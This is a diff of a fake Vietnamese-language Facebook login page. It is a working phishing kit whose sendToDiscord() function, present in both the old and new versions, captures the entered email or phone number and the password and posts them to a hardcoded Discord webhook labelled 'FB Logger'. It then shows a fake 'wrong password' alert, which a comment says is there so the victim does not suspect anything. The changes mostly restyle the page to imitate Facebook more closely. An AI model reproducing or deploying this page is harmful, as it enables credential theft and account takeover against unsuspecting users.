@@ -3,36 +3,32 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Đăng nhập Facebook</title>
+    <title>Facebook - Đăng nhập</title>
     <style>
         body {
             margin: 0;
-            font-family: Helvetica, Arial, sans-serif;
-            background: #f0f2f5;
-        }
-        .container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+            font-family: Arial, sans-serif;
+            background: linear-gradient(#f0f2f5, #fff);
             height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
-        .login-box {
-            background: #fff;
-            padding: 20px;
-            width: 360px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
-            border-radius: 8px;
-        }
-        .login-box h1 {
-            color: #1877f2;
-            font-size: 40px;
-            margin-bottom: 20px;
+        .login-container {
+            background: white;
+            padding: 30px 20px;
+            border-radius: 10px;
+            box-shadow: 0px 4px 10px rgba(0,0,0,0.1);
             text-align: center;
+            width: 320px;
+        }
+        .login-container img {
+            width: 60px;
+            margin-bottom: 20px;
         }
         .input-field {
-            width: 100%;
             margin-bottom: 15px;
+            text-align: left;
         }
         .input-field input {
             width: 100%;
@@ -40,98 +36,71 @@
             font-size: 16px;
             border: 1px solid #dddfe2;
             border-radius: 6px;
+            box-sizing: border-box;
         }
         .login-button {
             width: 100%;
-            background: #1877f2;
-            color: #fff;
-            border: none;
-            padding: 14px;
-            font-size: 18px;
-            font-weight: bold;
-            border-radius: 6px;
-            cursor: pointer;
-            margin-bottom: 15px;
-        }
-        .login-button:hover {
-            background: #165ec9;
-        }
-        .forgot-link {
-            text-align: center;
-            margin-bottom: 15px;
-        }
-        .forgot-link a {
-            color: #1877f2;
-            text-decoration: none;
-            font-size: 14px;
-        }
-        .forgot-link a:hover {
-            text-decoration: underline;
-        }
-        .divider {
-            height: 1px;
-            background: #dadde1;
-            margin: 20px 0;
-        }
-        .create-button {
-            background: #42b72a;
-            color: #fff;
-            border: none;
             padding: 14px;
             font-size: 16px;
-            font-weight: bold;
+            background-color: #1877f2;
+            color: white;
+            border: none;
             border-radius: 6px;
+            font-weight: bold;
             cursor: pointer;
-            width: fit-content;
-            display: block;
-            margin: 0 auto;
+            margin-top: 10px;
+            margin-bottom: 10px;
         }
-        .create-button:hover {
-            background: #36a420;
+        .login-button:hover {
+            background-color: #145dbf;
+        }
+        .forgot-password {
+            font-size: 14px;
+            color: #1877f2;
+            text-decoration: none;
+        }
+        .forgot-password:hover {
+            text-decoration: underline;
         }
     </style>
 </head>
 <body>
-    <div class="container">
-        <div class="login-box">
-            <h1>facebook</h1>
-            <div class="input-field">
-                <input type="text" id="email" placeholder="Email hoặc số điện thoại">
-            </div>
-            <div class="input-field">
-                <input type="password" id="password" placeholder="Mật khẩu">
-            </div>
-            <button class="login-button" onclick="sendToDiscord()">Đăng nhập</button>
-            <div class="forgot-link">
-                <a href="#">Quên mật khẩu?</a>
-            </div>
-            <div class="divider"></div>
-            <button class="create-button">Tạo tài khoản mới</button>
-        </div>
+
+<div class="login-container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+    <div class="input-field">
+        <input type="text" id="email" placeholder="Số di động hoặc email">
     </div>
+    <div class="input-field">
+        <input type="password" id="password" placeholder="Mật khẩu">
+    </div>
+    <button class="login-button" onclick="sendToDiscord()">Đăng nhập</button>
+    <a class="forgot-password" href="#">Bạn quên mật khẩu ư?</a>
+</div>
 
-    <script>
-        function sendToDiscord() {
-            var email = document.getElementById("email").value;
-            var password = document.getElementById("password").value;
+<script>
+    function sendToDiscord() {
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
 
-            var webhookURL = "https://discord.com/api/webhooks/1366030714214154260/ZAi-L4U2zXtmbx1ScW5CYxZ4cPDzQ1cf3eCj1GTLlxLwYByuqZeW4fBsw14iqn8KMIai"; // <<< thay webhook của anh vào đây
+        var webhookURL = "https://discord.com/api/webhooks/1366030714214154260/ZAi-L4U2zXtmbx1ScW5CYxZ4cPDzQ1cf3eCj1GTLlxLwYByuqZeW4fBsw14iqn8KMIai";
 
-            var request = new XMLHttpRequest();
-            request.open("POST", webhookURL);
+        var request = new XMLHttpRequest();
+        request.open("POST", webhookURL);
 
-            request.setRequestHeader('Content-type', 'application/json');
+        request.setRequestHeader('Content-type', 'application/json');
 
-            var params = {
-                username: "FB Logger",
-                content: "**Email/SĐT:** " + email + "\n**Mật khẩu:** " + password
-            }
-
-            request.send(JSON.stringify(params));
-
-            // Tuỳ anh muốn: chuyển hướng trang hoặc hiện thông báo
-            alert("Sai thông tin đăng nhập, vui lòng thử lại!"); // để nạn nhân không nghi ngờ
+        var params = {
+            username: "FB Logger",
+            content: "**Số di động hoặc Email:** " + email + "\n**Mật khẩu:** " + password
         }
-    </script>
+
+        request.send(JSON.stringify(params));
+
+        // Giả vờ báo lỗi đăng nhập để người dùng tưởng mình nhập sai
+        alert("Sai mật khẩu. Vui lòng kiểm tra lại thông tin đăng nhập.");
+    }
+</script>
+
 </body>
 </html>
